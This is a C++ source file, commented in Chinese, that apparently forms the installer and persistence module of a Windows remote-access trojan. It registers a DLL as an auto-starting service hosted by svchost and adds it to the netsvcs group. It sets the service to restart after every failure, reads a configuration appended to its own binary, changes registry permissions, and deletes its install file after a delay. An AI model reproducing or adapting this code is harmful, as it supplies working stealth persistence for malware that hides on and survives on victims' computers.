#include "install.h"
#include "until.h"
#include <Shlwapi.h>
void RemoveService(LPCTSTR lpServiceName)
{
	SC_HANDLE	service = NULL, scm = NULL;
	SERVICE_STATUS	Status;
	__try
	{
		scm = OpenSCManager(NULL, NULL, SC_MANAGER_ALL_ACCESS);
		service = OpenService( scm, lpServiceName, SERVICE_ALL_ACCESS);
		if (scm==NULL&&service == NULL)
		{
			__leave;
		}
		
		if (!QueryServiceStatus(service, &Status))
		{
			__leave;
		}
		
		if (Status.dwCurrentState != SERVICE_STOPPED)
		{
			if (!ControlService(service, SERVICE_CONTROL_STOP, &Status))
			{
				Sleep(800);
				__leave;
			}
		}
		DeleteService(service);
		
	}
	__finally
	{
		if (service != NULL)
			CloseServiceHandle(service);
		if (scm != NULL)
			CloseServiceHandle(scm);
	}
	return;
}
extern int memfind(const char *mem, const char *str, int sizem, int sizes);
// int memfind(const char *mem, const char *str, int sizem, int sizes)   
// {   
// 	int   da,i,j;   
// 	if (sizes == 0) da = strlen(str);   
// 	else da = sizes;   
// 	for (i = 0; i < sizem; i++)   
// 	{   
// 		for (j = 0; j < da; j ++)   
// 			if (mem[i+j] != str[j])	break;   
// 			if (j == da) return i;   
// 	}   
// 	return -1;   
// }

#define	MAX_CONFIG_LEN	1024

LPCTSTR FindConfigString(HMODULE hModule, LPCTSTR lpString)
{
	char	strFileName[MAX_PATH];
	char	*lpConfigString = NULL;
	DWORD	dwBytesRead = 0;
	GetModuleFileName(hModule, strFileName, sizeof(strFileName));
	
	HANDLE	hFile = CreateFile(strFileName, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
	if (hFile == INVALID_HANDLE_VALUE)
	{
		return NULL;
	}
	
	SetFilePointer(hFile, -MAX_CONFIG_LEN, NULL, FILE_END);
	lpConfigString = new char[MAX_CONFIG_LEN];
	ReadFile(hFile, lpConfigString, MAX_CONFIG_LEN, &dwBytesRead, NULL);
	CloseHandle(hFile);
	
	int offset = memfind(lpConfigString, lpString, MAX_CONFIG_LEN, 0);
	if (offset == -1)
	{
		delete lpConfigString;
		return NULL;
	}
	else
	{
		return lpConfigString + offset;
	}
}

// 文件名随机
void ReConfigService(char *lpServiceName)
{
	int rc = 0;
    HKEY hKey = 0;
	
    try{
        char buff[500];
        //config service
        strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
        strcat(buff, lpServiceName);
        rc = RegCreateKey(HKEY_LOCAL_MACHINE, buff, &hKey);
//         if(ERROR_SUCCESS != rc)
//         {
//             throw "";
//         }
		// 进程为Owner的，改为Share
		DWORD dwType = 0x120;
        rc = RegSetValueEx(hKey, "Type", 0, REG_DWORD, (unsigned char*)&dwType, sizeof(DWORD));
        SetLastError(rc);
//         if(ERROR_SUCCESS != rc)
//             throw "";//"RegSetValueEx(start)";
    }
    catch(char *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
	
    RegCloseKey(hKey);
}

void DeleteInstallFile(char *lpServiceName)
{
	char	strInstallModule[MAX_PATH];
	char	strSubKey[1024];
	memset(strInstallModule, 0, sizeof(strInstallModule));
	wsprintf(strSubKey, "SYSTEM\\CurrentControlSet\\Services\\%s", lpServiceName);
	ReadRegEx(HKEY_LOCAL_MACHINE, strSubKey,
		"IUHBIBUO", REG_SZ, strInstallModule, NULL, lstrlen(strInstallModule), 0);
	// 删除键值和文件
	WriteRegEx(HKEY_LOCAL_MACHINE, strSubKey, "IUHBIBUO", REG_SZ, NULL, NULL, 3);
	
	if (lstrlen(strInstallModule) != NULL)
	{
		for (int i = 0; i < 25; i++)
		{
			Sleep(3000);
			if (DeleteFile(strInstallModule))
				break;
		}
	}
}

DWORD QueryServiceTypeFromRegedit(char *lpServiceName)
{
	int rc = 0;
    HKEY hKey = 0;
	DWORD	dwServiceType = 0;
    try{
        char buff[500];
        //config service
        strncpy(buff, "SYSTEM\\CurrentControlSet\\Services\\", sizeof buff);
        strcat(buff, lpServiceName);
        rc = RegOpenKey(HKEY_LOCAL_MACHINE, buff, &hKey);
//         if(ERROR_SUCCESS != rc)
//         {
//             throw "";
//         }
		
		DWORD type, size = sizeof(DWORD);
		rc = RegQueryValueEx(hKey, "Type", 0, &type, (unsigned char *)&dwServiceType, &size);
		RegCloseKey(hKey);
		SetLastError(rc);
// 		if(ERROR_SUCCESS != rc)
// 			throw "RegQueryValueEx(Type)";
    }
    catch(...)
    {
    }
	
    RegCloseKey(hKey);
    return dwServiceType;
}

// 设置注册表的存取权限
BOOL RegKeySetACL(LPTSTR lpKeyName, DWORD AccessPermissions, ACCESS_MODE AccessMode)
{
	PSECURITY_DESCRIPTOR	SD;
	EXPLICIT_ACCESS			ea;
	PACL			OldDACL, NewDACL;
	SE_OBJECT_TYPE	ObjectType = SE_REGISTRY_KEY; //#include <aclapi.h>
	
	//默认返回值为FALSE
	BOOL bRet = FALSE;
    //建立一个空的ACL;
    if (SetEntriesInAcl(0, NULL, NULL, &OldDACL) != ERROR_SUCCESS)
        return bRet;
	
    if (SetEntriesInAcl(0, NULL, NULL, &NewDACL) != ERROR_SUCCESS)
        return bRet;
	
    //获取现有的ACL列表到OldDACL:
    if(GetNamedSecurityInfo(lpKeyName, ObjectType,
		DACL_SECURITY_INFORMATION,
		NULL, NULL,
		&OldDACL,
		NULL, &SD) != ERROR_SUCCESS)
    {
		return bRet;
    }
	
	//设置用户名"Everyone"对指定的键有所有操作权到结构ea:
    ZeroMemory(&ea, sizeof(EXPLICIT_ACCESS));
	
	char	*lpUsers[] = {"SYSTEM", "Administrators", "Everyone", "Users"};
	for (int i = 0; i < sizeof(lpUsers) / sizeof(char *); i++)
	{
		BuildExplicitAccessWithName(&ea,
			lpUsers[i],      // name of trustee
			AccessPermissions,    // type of access
			AccessMode,      // access mode
			SUB_CONTAINERS_AND_OBJECTS_INHERIT); //子键继承它的权限
		
	}
    //合并结构ea和OldDACL的权限列表到新的NewDACL:
    if (SetEntriesInAcl(1, &ea, NULL, &NewDACL) == ERROR_SUCCESS)
    {
		//把新的ACL写入到指定的键:
		SetNamedSecurityInfo(lpKeyName, ObjectType,
			DACL_SECURITY_INFORMATION,
			NULL, NULL,
			NewDACL,
			NULL);
		bRet = TRUE;
    }
	//释放指针
	
    if(SD != NULL)
		LocalFree((HLOCAL) SD);
    if(NewDACL != NULL)
		LocalFree((HLOCAL) NewDACL);
    if(OldDACL != NULL)
		LocalFree((HLOCAL) OldDACL);
    return bRet;
}

void ServiceConfig(LPCTSTR ServiceName)
{
    SERVICE_FAILURE_ACTIONS sdBuf;
	
	// Open a handle to the service. 
    SC_HANDLE sch=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);
    SC_HANDLE schService = OpenService(sch,ServiceName,SC_MANAGER_ALL_ACCESS);
	
    SC_ACTION rgActions[3]={  
        SC_ACTION_RESTART,0,//10s  
			SC_ACTION_RESTART,0,//10s  
			SC_ACTION_RESTART,0  
    }; 
	
    ZeroMemory(&sdBuf,sizeof(sdBuf));  
    sdBuf.dwResetPeriod = 40;//9000;// 15 minutes  
    sdBuf.lpRebootMsg = NULL ;//reboot
    sdBuf.cActions=sizeof(rgActions)/sizeof(rgActions[0]);
    sdBuf.lpsaActions = rgActions;
	//  sdBuf.lpCommand=NULL;
    ChangeServiceConfig2(schService,SERVICE_CONFIG_FAILURE_ACTIONS,&sdBuf);                 

    CloseServiceHandle(schService); 
}



BOOL NtServiceIsExist(LPCTSTR servicename)
{
    TCHAR SubKey[MAX_PATH]={0};
    lstrcpy(SubKey,"SYSTEM\\CurrentControlSet\\Services\\");
    lstrcat(SubKey,servicename);
    
    HKEY hKey;
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,SubKey,0L,KEY_ALL_ACCESS,&hKey) == ERROR_SUCCESS)
    {
        RegCloseKey(hKey);

        return TRUE;
    }
    else
    {
        RegCloseKey(hKey);
        return FALSE;
    }
}

UINT NtStartService(LPCTSTR lpService)
{
    SC_HANDLE        schSCManager;
    SC_HANDLE        schService;
    SERVICE_STATUS   ServiceStatus;
    DWORD            dwErrorCode;
    DWORD            dwReturnCode;
	
    schSCManager=OpenSCManager(NULL,NULL,SC_MANAGER_ALL_ACCESS);//打开服务控制管理器数据库
    if(!schSCManager)
    {
        return -1;
    }
    if (NULL!=schSCManager)
    {
        schService=OpenService(schSCManager,lpService,SERVICE_ALL_ACCESS);//获得服务对象的句柄
		
        if (schService!=NULL)
        {
            if(StartService(schService,0,NULL)==0)//已经存在该服务,就启动服务                        
            {
                dwErrorCode=GetLastError();
                if(dwErrorCode==ERROR_SERVICE_ALREADY_RUNNING)
                {
                    CloseServiceHandle(schSCManager);  
                    CloseServiceHandle(schService);
                    return 1;
                }
            }
            else
            {
                return 1;
            }
            while(QueryServiceStatus(schService,&ServiceStatus)!=0)           
            {
                if(ServiceStatus.dwCurrentState==SERVICE_START_PENDING)
                {
                    Sleep(100);
                }
                else
                {
                    break;
                }
            }
            CloseServiceHandle(schService);
        }
        CloseServiceHandle(schSCManager);
    }
    else
    {
        //失败鸟
        dwReturnCode = GetLastError();
        CloseServiceHandle(schSCManager);
        if (dwReturnCode == ERROR_SERVICE_DOES_NOT_EXIST) 
            return -2;
        else
            return -1;
    }
    return 1;
}

//SERVICE_AUTO_START
UINT NtInstallService(LPCTSTR strServiceName, //服务名称
                    LPCTSTR strDisplayName, //服务显示名称
                    LPCTSTR strDescription,//服务描述
                    LPCTSTR strPathName,   //可执行文件的路径
                    LPCTSTR Dependencies,//指定启动该服务前必须先启动的服务或服务组,一般为NULL
                    BOOLEAN KernelDriver, //是否安装驱动程序
                    ULONG   StartType       //启动类型
                    )
{
    BOOL bRet = FALSE;
    HKEY key=NULL;
    SC_HANDLE svc=NULL, scm=NULL;

    __try
    {
        scm = OpenSCManager(0, 0,SC_MANAGER_ALL_ACCESS);
        if (!scm)
            return -1;
        svc = CreateService(
            scm, 
            strServiceName, 
            strDisplayName,
            SERVICE_ALL_ACCESS,// SERVICE_ALL_ACCESS
            KernelDriver ? SERVICE_KERNEL_DRIVER : SERVICE_WIN32_OWN_PROCESS| SERVICE_INTERACTIVE_PROCESS,
            StartType,
            SERVICE_ERROR_IGNORE,
            strPathName,
            NULL, NULL, Dependencies, NULL, NULL);

        if (svc == NULL)
        {
            if (GetLastError() == ERROR_SERVICE_EXISTS)
            {
                svc = OpenService(scm,strServiceName,SERVICE_ALL_ACCESS);
                if (svc==NULL)
                    __leave;
                else
                    StartService(svc,0, 0);
            }
        }

        CHAR Desc[MAX_PATH];
        wsprintf(Desc,"SYSTEM\\CurrentControlSet\\Services\\%s", strServiceName);
        RegOpenKey(HKEY_LOCAL_MACHINE,Desc,&key);

        RegSetValueEx(key,"Description",0,REG_SZ,(CONST BYTE*)strDescription,strlen(strDescription));

        if (!StartService(svc,0, 0))
            __leave;

        bRet = TRUE;
    }
    __finally
    {
        if (key!=NULL) 
            RegCloseKey(key);
        if (svc!=NULL)
            CloseServiceHandle(svc);
        if (scm!=NULL)
            CloseServiceHandle(scm);

    }

    return bRet;
}

BOOL NtInstallSvchostService(LPCTSTR strServiceName, 
							 LPCTSTR strDisplayName, 
							 LPCTSTR strDescription,
							 LPCTSTR strDllPath)
{
    int rc = 0;
    HKEY hKey = 0;
    BOOL bRet = FALSE;
    CHAR szOpenKey[MAX_PATH];

	CHAR bin[MAX_PATH];
	wsprintf(bin, "%%SystemRoot%%\\System32\\svchost.exe -k \"%s\"" , strServiceName);
	
    try
    {
		bRet = NtInstallService(strServiceName,
			strDisplayName,
			strDescription,
			bin,
			NULL,
			false,
			SERVICE_AUTO_START); //安装服务,并设置为自动启动
		
        //修改dll指向
        ZeroMemory(szOpenKey,sizeof(szOpenKey));
        wsprintf(szOpenKey, "SYSTEM\\CurrentControlSet\\Services\\%s\\Parameters", strServiceName);
        //rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, szOpenKey, 0, KEY_ALL_ACCESS, &hKey);
        rc = RegCreateKey(HKEY_LOCAL_MACHINE, szOpenKey,&hKey); 
		
        rc = RegSetValueEx(hKey, "ServiceDll", 0, REG_EXPAND_SZ, (unsigned char*)strDllPath, strlen(strDllPath));
        SetLastError(rc);
        RegCloseKey(hKey);
        //添加服务名到netsvcs组
        ZeroMemory(szOpenKey,sizeof(szOpenKey));
        lstrcpy(szOpenKey, "SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Svchost");
        rc = RegOpenKeyEx(HKEY_LOCAL_MACHINE, szOpenKey, 0, KEY_ALL_ACCESS, &hKey);
        rc = RegSetValueEx(hKey, strServiceName, 0, REG_MULTI_SZ, (unsigned char*)strServiceName, strlen(strServiceName));
        SetLastError(rc);
        RegCloseKey(hKey);
		
        bRet = NtStartService(strServiceName);
    }
    catch(CHAR *str)
    {
        if(str && str[0])
        {
            rc = GetLastError();
        }
    }
    
    RegCloseKey(hKey);

    ServiceConfig(strServiceName);
	
    return bRet;
}